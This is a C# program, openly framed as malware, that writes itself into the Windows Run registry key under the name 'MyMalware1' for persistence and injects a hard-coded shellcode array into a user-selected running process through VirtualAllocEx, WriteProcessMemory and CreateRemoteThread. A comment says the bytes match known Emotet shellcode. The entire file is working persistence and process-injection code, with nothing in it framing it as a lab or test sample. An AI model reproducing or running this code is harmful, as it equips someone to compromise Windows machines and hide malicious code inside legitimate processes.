using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class ProcessInjection
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    private const int PROCESS_ALL_ACCESS = 0x1F0FFF;
    private const uint MEM_COMMIT = 0x1000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;

    static void Main()
    {
        string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
        AddToStartup(exePath);

        ListRunningProcesses();
    }

    private static void ListRunningProcesses()
    {
        Process[] processes = Process.GetProcesses();
        for (int i = 0; i < processes.Length; i++)
        {
            Console.WriteLine($"{i}: {processes[i].ProcessName} (ID: {processes[i].Id})");
        }

        Console.WriteLine("Enter the number of the process you want to inject:");
        int index;
        if (int.TryParse(Console.ReadLine(), out index) && index >= 0 && index < processes.Length)
        {
            Inject(processes[index].Id);
        }
        else
        {
            Console.WriteLine("Invalid selection.");
        }
    }
    private static void AddToStartup(string exePath)
    {
        RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        rk.SetValue("MyMalware1", exePath);
        Console.WriteLine("Added to startup.");
    }

    private static void Inject(int processId)
    {
        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);

        byte[] shellcode = new byte[]
        {
            // Shellcode to match known Emotet shellcode (decrypt_resource_v1)
            0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x10, 0x53, 0x8B, 0xD9, 0x8B, 0xC2, 0x56, 0x57, 0x89, 0x45, 0xF4,
            0x8B, 0x3B, 0x33, 0xF8, 0x8B, 0xC7, 0x89, 0x7D, 0xF8, 0x83, 0xE0, 0x0F, 0x75, 0x12, 0x8D, 0x77,
            0x08, 0xEB, 0x05, 0x8B, 0xF7, 0x2B, 0xF0, 0x83, 0xC6, 0x10, 0x8D, 0x0C, 0x36, 0xE8, 0x12, 0x34,
            0x56, 0x78, 0x8B, 0xD0, 0x89, 0x55, 0xFC, 0x85, 0xD2, 0x74, 0x10, 0x83, 0x65, 0xF4, 0x00, 0x8D,
            0x43, 0x08, 0x83, 0x65, 0xF8, 0x00, 0xC1, 0xEE, 0x10, 0x8D, 0x0C, 0xB0, 0x8B, 0xF2, 0x8B, 0xD9,
            0x2B, 0xD8, 0x83, 0xC3, 0x10, 0xC1, 0xEB, 0x10, 0x3B, 0xC1, 0x0F, 0x47, 0x5D, 0xF4, 0x85, 0xDB,
            0x74, 0x10, 0x8B, 0x55, 0xF8, 0x8B, 0xF8, 0x8B, 0x0F, 0x8D, 0x7F, 0x08, 0x33, 0xCA, 0x0F, 0xB6,
            0xC1, 0x66, 0x89, 0x06, 0x8B, 0xC1, 0xC1, 0xE8, 0x10, 0x8D, 0x76, 0x08, 0x0F, 0xB6, 0xC0, 0x66,
            0x89, 0x46, 0x08, 0xC1, 0xE9, 0x10, 0x0F, 0xB6, 0xC1, 0x66, 0x89, 0x46, 0x0C, 0xC1, 0xE9, 0x10,
            0x0F, 0xB6, 0xC1, 0x66, 0x89, 0x46, 0x10, 0x8B, 0x45, 0xF4, 0x40, 0x89, 0x45, 0xF4, 0x3B, 0xC3,
            0x72, 0xF1, 0x8B, 0x7D, 0xFC, 0x8B, 0x55, 0xF4, 0x33, 0xC0, 0x66, 0x89, 0x04, 0x7A, 0x5F, 0x5E,
            0x8B, 0xC2, 0x5B, 0x8B, 0xE5, 0x5D, 0xC3
        };

        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        IntPtr outSize;
        WriteProcessMemory(hProcess, addr, shellcode, (uint)shellcode.Length, out outSize);

        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out outSize);

        if (hThread != IntPtr.Zero)
        {
            Console.WriteLine("Injection successful.");
        }
        else
        {
            Console.WriteLine("Injection failed.");
        }

    }
}
